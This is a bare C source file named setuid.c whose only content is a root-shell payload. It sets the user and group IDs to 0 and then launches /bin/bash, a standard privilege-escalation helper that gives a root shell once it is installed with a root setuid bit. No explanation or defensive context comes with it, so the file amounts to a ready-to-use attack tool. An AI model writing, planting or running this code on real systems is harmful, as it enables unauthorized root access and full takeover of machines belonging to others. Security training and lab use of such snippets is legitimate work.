# setuid.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```